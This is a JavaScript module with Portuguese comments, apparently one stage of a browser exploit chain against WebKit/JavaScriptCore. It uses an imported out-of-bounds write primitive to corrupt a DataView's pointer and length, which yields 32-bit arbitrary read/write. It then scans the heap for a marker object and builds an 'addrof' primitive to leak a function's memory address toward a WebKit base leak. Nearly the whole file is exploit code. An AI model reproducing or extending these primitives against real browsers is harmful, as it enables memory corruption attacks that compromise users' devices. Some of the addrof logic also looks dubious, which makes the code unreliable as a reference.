// js/script3/testArrayBufferVictimCrash.mjs (v23 - CORREÇÃO DE REFERENCEERROR)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex } from '../utils.mjs';
import { triggerOOB_primitive, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Targeted_32bit_Exploit_v23_Fix";

// =======================================================================================
// SEÇÃO DE CONSTANTES E CONFIGURAÇÕES DE 32 BITS
// =======================================================================================

const OOB_DV_METADATA_BASE = 0x58;
const VICTIM_DV_METADATA_ADDR_IN_OOB = OOB_DV_METADATA_BASE + 0x200;

// Agora usamos números, não AdvancedInt64
const VICTIM_DV_POINTER_LOW_ADDR = VICTIM_DV_METADATA_ADDR_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const VICTIM_DV_POINTER_HIGH_ADDR = VICTIM_DV_POINTER_LOW_ADDR + 4;
const VICTIM_DV_LENGTH_ADDR = VICTIM_DV_METADATA_ADDR_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;

const HEAP_SCAN_START_32BIT = 0x20000000;
const HEAP_SCAN_SIZE = 0x10000000;

// =======================================================================================
// A FUNÇÃO DE ATAQUE DE 32 BITS
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");

    let final_result = { success: false, message: "A cadeia de exploração falhou." };
    
    try {
        // --- FASE 1: Construção das Primitivas de R/W ---
        logS3("--- Fase 1: Construindo Primitivas de R/W de 32 bits ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        let victim_dv = new DataView(new ArrayBuffer(4096));

        const arb_write32 = (address, value) => {
            oob_write_absolute(VICTIM_DV_POINTER_LOW_ADDR, address, 4);
            oob_write_absolute(VICTIM_DV_POINTER_HIGH_ADDR, 0, 4);
            oob_write_absolute(VICTIM_DV_LENGTH_ADDR, 4, 4);
            victim_dv.setUint32(0, value, true);
        };
        const arb_read32 = (address) => {
            oob_write_absolute(VICTIM_DV_POINTER_LOW_ADDR, address, 4);
            oob_write_absolute(VICTIM_DV_POINTER_HIGH_ADDR, 0, 4);
            oob_write_absolute(VICTIM_DV_LENGTH_ADDR, 4, 4);
            return victim_dv.getUint32(0, true);
        };
        logS3("    Primitivas de Leitura/Escrita (R/W) de 32 bits funcionais.", "vuln");

        // --- FASE 2: Escaneamento de Memória para Info Leak ---
        logS3("--- Fase 2: Escaneamento de Memória de 32 bits para Vazamento de Endereço ---", "subtest");
        let leaker_obj = { a: 0x13371337, b: 0xCAFECAFE };
        let leaker_obj_addr = 0;

        logS3(`    Escaneando a memória a partir de ${toHex(HEAP_SCAN_START_32BIT)}...`, "info");
        for (let i = 0; i < HEAP_SCAN_SIZE; i += 4) {
            let current_addr = HEAP_SCAN_START_32BIT + i;
            if (arb_read32(current_addr) === leaker_obj.a && arb_read32(current_addr + 4) === leaker_obj.b) {
                // =============================================================
                // CORREÇÃO AQUI: Usado JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET
                // =============================================================
                leaker_obj_addr = current_addr - JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
                logS3(`    MARCADOR ENCONTRADO! Endereço do objeto: ${toHex(leaker_obj_addr)}`, "leak");
                break;
            }
        }
        if (leaker_obj_addr === 0) throw new Error("Escaneamento de 32 bits falhou.");

        // --- FASE 3: Construção da Primitiva 'addrof' e Conclusão ---
        logS3("--- Fase 3: Construindo 'addrof' e Vazando a Base do WebKit ---", "subtest");
        const butterfly_addr = leaker_obj_addr + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;

        const addrof_primitive = (obj) => {
            leaker_obj.a = obj;
            arb_write32(butterfly_addr, 0x41414141);
            leaker_obj.a = obj;
            return arb_read32(butterfly_addr);
        };
        logS3("    Primitiva 'addrof' de 32 bits construída.", "vuln");
        
        const target_func = () => {};
        const target_addr = addrof_primitive(target_func);
        if (target_addr === 0 || target_addr === 0x41414141) {
            throw new Error(`Falha ao obter endereço válido com 'addrof', recebeu: ${toHex(target_addr)}`);
        }
        logS3(`    Endereço REAL da função alvo: ${toHex(target_addr)}`, "leak");
        
        final_result = { success: true, message: `SUCESSO! Endereço vazado com a estratégia de 32 bits: ${toHex(target_addr)}` };
        logS3(`    ${final_result.message}`, "vuln");

    } catch (e) {
        final_result.message = `ERRO na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
